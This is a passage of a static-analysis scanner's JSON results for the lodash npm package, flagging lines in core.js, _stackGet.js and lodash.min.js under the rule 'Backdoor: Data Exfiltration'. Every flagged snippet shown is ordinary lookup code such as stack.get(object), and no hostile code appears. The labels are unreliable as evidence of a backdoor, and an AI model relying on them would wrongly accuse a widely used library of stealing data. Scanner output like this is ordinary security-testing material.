                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/core.js"
                },
                "region": {
                  "startLine": 1304,
                  "startColumn": 26,
                  "endLine": 1304,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    }\n    // Check that cyclic values are equal.\n    var objStacked = stack.get(object);\n    var othStacked = stack.get(other);\n    if (objStacked && othStacked) {\n      return objStacked == other && othStacked == object;\n    }\n",
                    "rendered": {
                      "text": "    }\n    // Check that cyclic values are equal.\n    var objStacked = stack.get(object);\n    var othStacked = stack.get(other);\n    if (objStacked && othStacked) {\n      return objStacked == other && othStacked == object;\n    }\n",
                      "markdown": "`    }\n    // Check that cyclic values are equal.\n    var objStacked = stack.get(object);\n    var othStacked = stack.get(other);\n    if (objStacked && othStacked) {\n      return objStacked == other && othStacked == object;\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/core.js"
                },
                "region": {
                  "startLine": 1303,
                  "startColumn": 26,
                  "endLine": 1303,
                  "endColumn": 31,
                  "snippet": {
                    "text": "      }\n    }\n    // Check that cyclic values are equal.\n    var objStacked = stack.get(object);\n    var othStacked = stack.get(other);\n    if (objStacked && othStacked) {\n      return objStacked == other && othStacked == object;\n",
                    "rendered": {
                      "text": "      }\n    }\n    // Check that cyclic values are equal.\n    var objStacked = stack.get(object);\n    var othStacked = stack.get(other);\n    if (objStacked && othStacked) {\n      return objStacked == other && othStacked == object;\n",
                      "markdown": "`      }\n    }\n    // Check that cyclic values are equal.\n    var objStacked = stack.get(object);\n    var othStacked = stack.get(other);\n    if (objStacked && othStacked) {\n      return objStacked == other && othStacked == object;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/core.js"
                },
                "region": {
                  "startLine": 1188,
                  "startColumn": 26,
                  "endLine": 1188,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    }\n    // Check that cyclic values are equal.\n    var arrStacked = stack.get(array);\n    var othStacked = stack.get(other);\n    if (arrStacked && othStacked) {\n      return arrStacked == other && othStacked == array;\n    }\n",
                    "rendered": {
                      "text": "    }\n    // Check that cyclic values are equal.\n    var arrStacked = stack.get(array);\n    var othStacked = stack.get(other);\n    if (arrStacked && othStacked) {\n      return arrStacked == other && othStacked == array;\n    }\n",
                      "markdown": "`    }\n    // Check that cyclic values are equal.\n    var arrStacked = stack.get(array);\n    var othStacked = stack.get(other);\n    if (arrStacked && othStacked) {\n      return arrStacked == other && othStacked == array;\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/core.js"
                },
                "region": {
                  "startLine": 1187,
                  "startColumn": 26,
                  "endLine": 1187,
                  "endColumn": 31,
                  "snippet": {
                    "text": "      return false;\n    }\n    // Check that cyclic values are equal.\n    var arrStacked = stack.get(array);\n    var othStacked = stack.get(other);\n    if (arrStacked && othStacked) {\n      return arrStacked == other && othStacked == array;\n",
                    "rendered": {
                      "text": "      return false;\n    }\n    // Check that cyclic values are equal.\n    var arrStacked = stack.get(array);\n    var othStacked = stack.get(other);\n    if (arrStacked && othStacked) {\n      return arrStacked == other && othStacked == array;\n",
                      "markdown": "`      return false;\n    }\n    // Check that cyclic values are equal.\n    var arrStacked = stack.get(array);\n    var othStacked = stack.get(other);\n    if (arrStacked && othStacked) {\n      return arrStacked == other && othStacked == array;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/_stackGet.js"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 22,
                  "endLine": 11,
                  "endColumn": 27,
                  "snippet": {
                    "text": " * @returns {*} Returns the entry value.\n */\nfunction stackGet(key) {\n  return this.__data__.get(key);\n}\n\nmodule.exports = stackGet;\n",
                    "rendered": {
                      "text": " * @returns {*} Returns the entry value.\n */\nfunction stackGet(key) {\n  return this.__data__.get(key);\n}\n\nmodule.exports = stackGet;\n",
                      "markdown": "` * @returns {*} Returns the entry value.\n */\nfunction stackGet(key) {\n  return this.__data__.get(key);\n}\n\nmodule.exports = stackGet;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.min.js"
                },
                "region": {
                  "startLine": 115,
                  "startColumn": 163,
                  "endLine": 115,
                  "endColumn": 168,
                  "snippet": {
                    "text": "(!0),ms=os?function(n,t){return os.set(n,t),n}:La,xs=Tl?function(n,t){return Tl(n,\"toString\",{configurable:!0,enumerable:!1,value:Sa(t),\nwritable:!0})}:La,js=uu,As=$l||function(n){return re.clearTimeout(n)},ks=es&&1/P(new es([,-0]))[1]==Sn?function(n){return new es(n)}:Da,Os=os?function(n){return os.get(n)}:Da,Is=Pl?function(n){return null==n?[]:(n=ll(n),i(Pl(n),function(t){return Wl.call(n,t)}))}:Pa,Rs=Pl?function(n){for(var t=[];n;)a(t,Is(n)),n=El(n);return t}:Pa,zs=we;(ns&&zs(new ns(new ArrayBuffer(1)))!=ct||ts&&zs(new ts)!=Gn||rs&&zs(rs.resolve())!=Qn||es&&zs(new es)!=tt||us&&zs(new us)!=it)&&(",
                    "rendered": {
                      "text": "(!0),ms=os?function(n,t){return os.set(n,t),n}:La,xs=Tl?function(n,t){return Tl(n,\"toString\",{configurable:!0,enumerable:!1,value:Sa(t),\nwritable:!0})}:La,js=uu,As=$l||function(n){return re.clearTimeout(n)},ks=es&&1/P(new es([,-0]))[1]==Sn?function(n){return new es(n)}:Da,Os=os?function(n){return os.get(n)}:Da,Is=Pl?function(n){return null==n?[]:(n=ll(n),i(Pl(n),function(t){return Wl.call(n,t)}))}:Pa,Rs=Pl?function(n){for(var t=[];n;)a(t,Is(n)),n=El(n);return t}:Pa,zs=we;(ns&&zs(new ns(new ArrayBuffer(1)))!=ct||ts&&zs(new ts)!=Gn||rs&&zs(rs.resolve())!=Qn||es&&zs(new es)!=tt||us&&zs(new us)!=it)&&(",
                      "markdown": "`(!0),ms=os?function(n,t){return os.set(n,t),n}:La,xs=Tl?function(n,t){return Tl(n,\"toString\",{configurable:!0,enumerable:!1,value:Sa(t),\nwritable:!0})}:La,js=uu,As=$l||function(n){return re.clearTimeout(n)},ks=es&&1/P(new es([,-0]))[1]==Sn?function(n){return new es(n)}:Da,Os=os?function(n){return os.get(n)}:Da,Is=Pl?function(n){return null==n?[]:(n=ll(n),i(Pl(n),function(t){return Wl.call(n,t)}))}:Pa,Rs=Pl?function(n){for(var t=[];n;)a(t,Is(n)),n=El(n);return t}:Pa,zs=we;(ns&&zs(new ns(new ArrayBuffer(1)))!=ct||ts&&zs(new ts)!=Gn||rs&&zs(rs.resolve())!=Qn||es&&zs(new es)!=tt||us&&zs(new us)!=it)&&(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.min.js"
                },
                "region": {
                  "startLine": 89,
                  "startColumn": 231,
                  "endLine": 89,
                  "endColumn": 236,
                  "snippet": {
                    "text": "\"in r,_=w?Gl(Ic(r.maxWait)||0,t):_,m=\"trailing\"in r?!!r.trailing:m),\ns.cancel=a,s.flush=l,s}function Lf(n){return ai(n,jn)}function Cf(n,t){if(\"function\"!=typeof n||null!=t&&\"function\"!=typeof t)throw new pl(en);var r=function(){var e=arguments,u=t?t.apply(this,e):e[0],i=r.cache;if(i.has(u))return i.get(u);var o=n.apply(this,e);return r.cache=i.set(u,o)||i,o};return r.cache=new(Cf.Cache||sr),r}function Uf(n){if(\"function\"!=typeof n)throw new pl(en);return function(){var t=arguments;switch(t.length){case 0:return!n.call(this);case 1:return!n.call(this,t[0]);case 2:\nreturn!n.call(this,t[0],t[1]);case",
                    "rendered": {
                      "text": "\"in r,_=w?Gl(Ic(r.maxWait)||0,t):_,m=\"trailing\"in r?!!r.trailing:m),\ns.cancel=a,s.flush=l,s}function Lf(n){return ai(n,jn)}function Cf(n,t){if(\"function\"!=typeof n||null!=t&&\"function\"!=typeof t)throw new pl(en);var r=function(){var e=arguments,u=t?t.apply(this,e):e[0],i=r.cache;if(i.has(u))return i.get(u);var o=n.apply(this,e);return r.cache=i.set(u,o)||i,o};return r.cache=new(Cf.Cache||sr),r}function Uf(n){if(\"function\"!=typeof n)throw new pl(en);return function(){var t=arguments;switch(t.length){case 0:return!n.call(this);case 1:return!n.call(this,t[0]);case 2:\nreturn!n.call(this,t[0],t[1]);case",
                      "markdown": "`\"in r,_=w?Gl(Ic(r.maxWait)||0,t):_,m=\"trailing\"in r?!!r.trailing:m),\ns.cancel=a,s.flush=l,s}function Lf(n){return ai(n,jn)}function Cf(n,t){if(\"function\"!=typeof n||null!=t&&\"function\"!=typeof t)throw new pl(en);var r=function(){var e=arguments,u=t?t.apply(this,e):e[0],i=r.cache;if(i.has(u))return i.get(u);var o=n.apply(this,e);return r.cache=i.set(u,o)||i,o};return r.cache=new(Cf.Cache||sr),r}function Uf(n){if(\"function\"!=typeof n)throw new pl(en);return function(){var t=arguments;switch(t.length){case 0:return!n.call(this);case 1:return!n.call(this,t[0]);case 2:\nreturn!n.call(this,t[0],t[1]);case`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.min.js"
                },
                "region": {
                  "startLine": 65,
                  "startColumn": 84,
                  "endLine": 65,
                  "endColumn": 89,
                  "snippet": {
                    "text": "urn a==t;e|=pn,o.set(n,t);var l=pi(f(n),f(t),e,u,i,o);return o.delete(n),l;case et:if(_s)return _s.call(n)==_s.call(t)}return!1}function vi(n,t,r,e,u,i){var o=r&hn,f=yi(n),c=f.length;if(c!=yi(t).length&&!o)return!1;\nfor(var a=c;a--;){var l=f[a];if(!(o?l in t:bl.call(t,l)))return!1}var s=i.get(n),h=i.get(t);if(s&&h)return s==t&&h==n;var p=!0;i.set(n,t),i.set(t,n);for(var _=o;++a<c;){l=f[a];var v=n[l],g=t[l];if(e)var y=o?e(g,v,l,t,n,i):e(v,g,l,n,t,i);if(!(y===X?v===g||u(v,g,r,e,i):y)){p=!1;break}_||(_=\"constructor\"==l)}if(p&&!_){var d=n.constructor,b=t.constructor;d!=b&&\"constructor\"in n&&\"constructo",
                    "rendered": {
                      "text": "urn a==t;e|=pn,o.set(n,t);var l=pi(f(n),f(t),e,u,i,o);return o.delete(n),l;case et:if(_s)return _s.call(n)==_s.call(t)}return!1}function vi(n,t,r,e,u,i){var o=r&hn,f=yi(n),c=f.length;if(c!=yi(t).length&&!o)return!1;\nfor(var a=c;a--;){var l=f[a];if(!(o?l in t:bl.call(t,l)))return!1}var s=i.get(n),h=i.get(t);if(s&&h)return s==t&&h==n;var p=!0;i.set(n,t),i.set(t,n);for(var _=o;++a<c;){l=f[a];var v=n[l],g=t[l];if(e)var y=o?e(g,v,l,t,n,i):e(v,g,l,n,t,i);if(!(y===X?v===g||u(v,g,r,e,i):y)){p=!1;break}_||(_=\"constructor\"==l)}if(p&&!_){var d=n.constructor,b=t.constructor;d!=b&&\"constructor\"in n&&\"constructo",
                      "markdown": "`urn a==t;e|=pn,o.set(n,t);var l=pi(f(n),f(t),e,u,i,o);return o.delete(n),l;case et:if(_s)return _s.call(n)==_s.call(t)}return!1}function vi(n,t,r,e,u,i){var o=r&hn,f=yi(n),c=f.length;if(c!=yi(t).length&&!o)return!1;\nfor(var a=c;a--;){var l=f[a];if(!(o?l in t:bl.call(t,l)))return!1}var s=i.get(n),h=i.get(t);if(s&&h)return s==t&&h==n;var p=!0;i.set(n,t),i.set(t,n);for(var _=o;++a<c;){l=f[a];var v=n[l],g=t[l];if(e)var y=o?e(g,v,l,t,n,i):e(v,g,l,n,t,i);if(!(y===X?v===g||u(v,g,r,e,i):y)){p=!1;break}_||(_=\"constructor\"==l)}if(p&&!_){var d=n.constructor,b=t.constructor;d!=b&&\"constructor\"in n&&\"constructo`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.min.js"
                },
                "region": {
                  "startLine": 65,
                  "startColumn": 73,
                  "endLine": 65,
                  "endColumn": 78,
                  "snippet": {
                    "text": "n);if(a)return a==t;e|=pn,o.set(n,t);var l=pi(f(n),f(t),e,u,i,o);return o.delete(n),l;case et:if(_s)return _s.call(n)==_s.call(t)}return!1}function vi(n,t,r,e,u,i){var o=r&hn,f=yi(n),c=f.length;if(c!=yi(t).length&&!o)return!1;\nfor(var a=c;a--;){var l=f[a];if(!(o?l in t:bl.call(t,l)))return!1}var s=i.get(n),h=i.get(t);if(s&&h)return s==t&&h==n;var p=!0;i.set(n,t),i.set(t,n);for(var _=o;++a<c;){l=f[a];var v=n[l],g=t[l];if(e)var y=o?e(g,v,l,t,n,i):e(v,g,l,n,t,i);if(!(y===X?v===g||u(v,g,r,e,i):y)){p=!1;break}_||(_=\"constructor\"==l)}if(p&&!_){var d=n.constructor,b=t.constructor;d!=b&&\"constructor\"in n&&",
                    "rendered": {
                      "text": "n);if(a)return a==t;e|=pn,o.set(n,t);var l=pi(f(n),f(t),e,u,i,o);return o.delete(n),l;case et:if(_s)return _s.call(n)==_s.call(t)}return!1}function vi(n,t,r,e,u,i){var o=r&hn,f=yi(n),c=f.length;if(c!=yi(t).length&&!o)return!1;\nfor(var a=c;a--;){var l=f[a];if(!(o?l in t:bl.call(t,l)))return!1}var s=i.get(n),h=i.get(t);if(s&&h)return s==t&&h==n;var p=!0;i.set(n,t),i.set(t,n);for(var _=o;++a<c;){l=f[a];var v=n[l],g=t[l];if(e)var y=o?e(g,v,l,t,n,i):e(v,g,l,n,t,i);if(!(y===X?v===g||u(v,g,r,e,i):y)){p=!1;break}_||(_=\"constructor\"==l)}if(p&&!_){var d=n.constructor,b=t.constructor;d!=b&&\"constructor\"in n&&",
                      "markdown": "`n);if(a)return a==t;e|=pn,o.set(n,t);var l=pi(f(n),f(t),e,u,i,o);return o.delete(n),l;case et:if(_s)return _s.call(n)==_s.call(t)}return!1}function vi(n,t,r,e,u,i){var o=r&hn,f=yi(n),c=f.length;if(c!=yi(t).length&&!o)return!1;\nfor(var a=c;a--;){var l=f[a];if(!(o?l in t:bl.call(t,l)))return!1}var s=i.get(n),h=i.get(t);if(s&&h)return s==t&&h==n;var p=!0;i.set(n,t),i.set(t,n);for(var _=o;++a<c;){l=f[a];var v=n[l],g=t[l];if(e)var y=o?e(g,v,l,t,n,i):e(v,g,l,n,t,i);if(!(y===X?v===g||u(v,g,r,e,i):y)){p=!1;break}_||(_=\"constructor\"==l)}if(p&&!_){var d=n.constructor,b=t.constructor;d!=b&&\"constructor\"in n&&`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.min.js"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 297,
                  "endLine": 64,
                  "endColumn": 302,
                  "snippet": {
                    "text": "1;\nn=n.buffer,t=t.buffer;case ft:return!(n.byteLength!=t.byteLength||!i(new Rl(n),new Rl(t)));case Nn:case Pn:case Hn:return Gf(+n,+t);case Zn:return n.name==t.name&&n.message==t.message;case nt:case rt:return n==t+\"\";case Gn:var f=M;case tt:var c=e&hn;if(f||(f=P),n.size!=t.size&&!c)return!1;var a=o.get(n);if(a)return a==t;e|=pn,o.set(n,t);var l=pi(f(n),f(t),e,u,i,o);return o.delete(n),l;case et:if(_s)return _s.call(n)==_s.call(t)}return!1}function vi(n,t,r,e,u,i){var o=r&hn,f=yi(n),c=f.length;if(c!=yi(t).length&&!o)return!1;\nfor(var a=c;a--;){var l=f[a];if(!(o?l in t:bl.call(t,l)))return!1}var s=i",
                    "rendered": {
                      "text": "1;\nn=n.buffer,t=t.buffer;case ft:return!(n.byteLength!=t.byteLength||!i(new Rl(n),new Rl(t)));case Nn:case Pn:case Hn:return Gf(+n,+t);case Zn:return n.name==t.name&&n.message==t.message;case nt:case rt:return n==t+\"\";case Gn:var f=M;case tt:var c=e&hn;if(f||(f=P),n.size!=t.size&&!c)return!1;var a=o.get(n);if(a)return a==t;e|=pn,o.set(n,t);var l=pi(f(n),f(t),e,u,i,o);return o.delete(n),l;case et:if(_s)return _s.call(n)==_s.call(t)}return!1}function vi(n,t,r,e,u,i){var o=r&hn,f=yi(n),c=f.length;if(c!=yi(t).length&&!o)return!1;\nfor(var a=c;a--;){var l=f[a];if(!(o?l in t:bl.call(t,l)))return!1}var s=i",
                      "markdown": "`1;\nn=n.buffer,t=t.buffer;case ft:return!(n.byteLength!=t.byteLength||!i(new Rl(n),new Rl(t)));case Nn:case Pn:case Hn:return Gf(+n,+t);case Zn:return n.name==t.name&&n.message==t.message;case nt:case rt:return n==t+\"\";case Gn:var f=M;case tt:var c=e&hn;if(f||(f=P),n.size!=t.size&&!c)return!1;var a=o.get(n);if(a)return a==t;e|=pn,o.set(n,t);var l=pi(f(n),f(t),e,u,i,o);return o.delete(n),l;case et:if(_s)return _s.call(n)==_s.call(t)}return!1}function vi(n,t,r,e,u,i){var o=r&hn,f=yi(n),c=f.length;if(c!=yi(t).length&&!o)return!1;\nfor(var a=c;a--;){var l=f[a];if(!(o?l in t:bl.call(t,l)))return!1}var s=i`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.min.js"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 79,
                  "endLine": 63,
                  "endColumn": 84,
                  "snippet": {
                    "text": ",p),n,t)}function li(n,t,r,e){return n===X||Gf(n,gl[r])&&!bl.call(e,r)?t:n}function si(n,t,r,e,u,i){return fc(n)&&fc(t)&&(i.set(t,n),Ke(n,t,X,si,i),i.delete(t)),n}function hi(n){return gc(n)?X:n}function pi(n,t,r,e,u,i){\nvar o=r&hn,f=n.length,c=t.length;if(f!=c&&!(o&&c>f))return!1;var a=i.get(n),l=i.get(t);if(a&&l)return a==t&&l==n;var s=-1,p=!0,_=r&pn?new yr:X;for(i.set(n,t),i.set(t,n);++s<f;){var v=n[s],g=t[s];if(e)var y=o?e(g,v,s,t,n,i):e(v,g,s,n,t,i);if(y!==X){if(y)continue;p=!1;break}if(_){if(!h(t,function(n,t){if(!S(_,t)&&(v===n||u(v,n,r,e,i)))return _.push(t)})){p=!1;break}}else if(v!==g&&!u",
                    "rendered": {
                      "text": ",p),n,t)}function li(n,t,r,e){return n===X||Gf(n,gl[r])&&!bl.call(e,r)?t:n}function si(n,t,r,e,u,i){return fc(n)&&fc(t)&&(i.set(t,n),Ke(n,t,X,si,i),i.delete(t)),n}function hi(n){return gc(n)?X:n}function pi(n,t,r,e,u,i){\nvar o=r&hn,f=n.length,c=t.length;if(f!=c&&!(o&&c>f))return!1;var a=i.get(n),l=i.get(t);if(a&&l)return a==t&&l==n;var s=-1,p=!0,_=r&pn?new yr:X;for(i.set(n,t),i.set(t,n);++s<f;){var v=n[s],g=t[s];if(e)var y=o?e(g,v,s,t,n,i):e(v,g,s,n,t,i);if(y!==X){if(y)continue;p=!1;break}if(_){if(!h(t,function(n,t){if(!S(_,t)&&(v===n||u(v,n,r,e,i)))return _.push(t)})){p=!1;break}}else if(v!==g&&!u",
                      "markdown": "`,p),n,t)}function li(n,t,r,e){return n===X||Gf(n,gl[r])&&!bl.call(e,r)?t:n}function si(n,t,r,e,u,i){return fc(n)&&fc(t)&&(i.set(t,n),Ke(n,t,X,si,i),i.delete(t)),n}function hi(n){return gc(n)?X:n}function pi(n,t,r,e,u,i){\nvar o=r&hn,f=n.length,c=t.length;if(f!=c&&!(o&&c>f))return!1;var a=i.get(n),l=i.get(t);if(a&&l)return a==t&&l==n;var s=-1,p=!0,_=r&pn?new yr:X;for(i.set(n,t),i.set(t,n);++s<f;){var v=n[s],g=t[s];if(e)var y=o?e(g,v,s,t,n,i):e(v,g,s,n,t,i);if(y!==X){if(y)continue;p=!1;break}if(_){if(!h(t,function(n,t){if(!S(_,t)&&(v===n||u(v,n,r,e,i)))return _.push(t)})){p=!1;break}}else if(v!==g&&!u`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.min.js"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 68,
                  "endLine": 63,
                  "endColumn": 73,
                  "snippet": {
                    "text": "(h?ms:Ss)(_,p),n,t)}function li(n,t,r,e){return n===X||Gf(n,gl[r])&&!bl.call(e,r)?t:n}function si(n,t,r,e,u,i){return fc(n)&&fc(t)&&(i.set(t,n),Ke(n,t,X,si,i),i.delete(t)),n}function hi(n){return gc(n)?X:n}function pi(n,t,r,e,u,i){\nvar o=r&hn,f=n.length,c=t.length;if(f!=c&&!(o&&c>f))return!1;var a=i.get(n),l=i.get(t);if(a&&l)return a==t&&l==n;var s=-1,p=!0,_=r&pn?new yr:X;for(i.set(n,t),i.set(t,n);++s<f;){var v=n[s],g=t[s];if(e)var y=o?e(g,v,s,t,n,i):e(v,g,s,n,t,i);if(y!==X){if(y)continue;p=!1;break}if(_){if(!h(t,function(n,t){if(!S(_,t)&&(v===n||u(v,n,r,e,i)))return _.push(t)})){p=!1;break}}else i",
                    "rendered": {
                      "text": "(h?ms:Ss)(_,p),n,t)}function li(n,t,r,e){return n===X||Gf(n,gl[r])&&!bl.call(e,r)?t:n}function si(n,t,r,e,u,i){return fc(n)&&fc(t)&&(i.set(t,n),Ke(n,t,X,si,i),i.delete(t)),n}function hi(n){return gc(n)?X:n}function pi(n,t,r,e,u,i){\nvar o=r&hn,f=n.length,c=t.length;if(f!=c&&!(o&&c>f))return!1;var a=i.get(n),l=i.get(t);if(a&&l)return a==t&&l==n;var s=-1,p=!0,_=r&pn?new yr:X;for(i.set(n,t),i.set(t,n);++s<f;){var v=n[s],g=t[s];if(e)var y=o?e(g,v,s,t,n,i):e(v,g,s,n,t,i);if(y!==X){if(y)continue;p=!1;break}if(_){if(!h(t,function(n,t){if(!S(_,t)&&(v===n||u(v,n,r,e,i)))return _.push(t)})){p=!1;break}}else i",
                      "markdown": "`(h?ms:Ss)(_,p),n,t)}function li(n,t,r,e){return n===X||Gf(n,gl[r])&&!bl.call(e,r)?t:n}function si(n,t,r,e,u,i){return fc(n)&&fc(t)&&(i.set(t,n),Ke(n,t,X,si,i),i.delete(t)),n}function hi(n){return gc(n)?X:n}function pi(n,t,r,e,u,i){\nvar o=r&hn,f=n.length,c=t.length;if(f!=c&&!(o&&c>f))return!1;var a=i.get(n),l=i.get(t);if(a&&l)return a==t&&l==n;var s=-1,p=!0,_=r&pn?new yr:X;for(i.set(n,t),i.set(t,n);++s<f;){var v=n[s],g=t[s];if(e)var y=o?e(g,v,s,t,n,i):e(v,g,s,n,t,i);if(y!==X){if(y)continue;p=!1;break}if(_){if(!h(t,function(n,t){if(!S(_,t)&&(v===n||u(v,n,r,e,i)))return _.push(t)})){p=!1;break}}else i`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.min.js"
                },
                "region": {
                  "startLine": 41,
                  "startColumn": 463,
                  "endLine": 41,
                  "endColumn": 468,
                  "snippet": {
                    "text": "Fi(t)?Ni(no(n),t):function(r){var e=Mc(r,n);return e===X&&e===t?Nc(r,n):Se(t,e,hn|pn)}}function Ke(n,t,r,e,u){n!==t&&bs(t,function(i,o){if(u||(u=new wr),fc(i))Ve(n,t,o,r,Ke,e,u);else{var f=e?e(Ji(n,o),i,o+\"\",n,t,u):X;f===X&&(f=i),Er(n,o,f)}},qc)}function Ve(n,t,r,e,u,i,o){var f=Ji(n,r),c=Ji(t,r),a=o.get(c);if(a)return Er(n,r,a),X;var l=i?i(f,c,r+\"\",n,t,o):X,s=l===X;\nif(s){var h=bh(c),p=!h&&mh(c),_=!h&&!p&&Oh(c);l=c,h||p||_?bh(f)?l=f:Jf(f)?l=Tu(f):p?(s=!1,l=Iu(c,!0)):_?(s=!1,l=Wu(c,!0)):l=[]:gc(c)||dh(c)?(l=f,dh(f)?l=Rc(f):fc(f)&&!uc(f)||(l=Ei(c))):s=!1}s&&(o.set(c,l),u(l,c,e,i,o),o.delete(c)),Er(n,",
                    "rendered": {
                      "text": "Fi(t)?Ni(no(n),t):function(r){var e=Mc(r,n);return e===X&&e===t?Nc(r,n):Se(t,e,hn|pn)}}function Ke(n,t,r,e,u){n!==t&&bs(t,function(i,o){if(u||(u=new wr),fc(i))Ve(n,t,o,r,Ke,e,u);else{var f=e?e(Ji(n,o),i,o+\"\",n,t,u):X;f===X&&(f=i),Er(n,o,f)}},qc)}function Ve(n,t,r,e,u,i,o){var f=Ji(n,r),c=Ji(t,r),a=o.get(c);if(a)return Er(n,r,a),X;var l=i?i(f,c,r+\"\",n,t,o):X,s=l===X;\nif(s){var h=bh(c),p=!h&&mh(c),_=!h&&!p&&Oh(c);l=c,h||p||_?bh(f)?l=f:Jf(f)?l=Tu(f):p?(s=!1,l=Iu(c,!0)):_?(s=!1,l=Wu(c,!0)):l=[]:gc(c)||dh(c)?(l=f,dh(f)?l=Rc(f):fc(f)&&!uc(f)||(l=Ei(c))):s=!1}s&&(o.set(c,l),u(l,c,e,i,o),o.delete(c)),Er(n,",
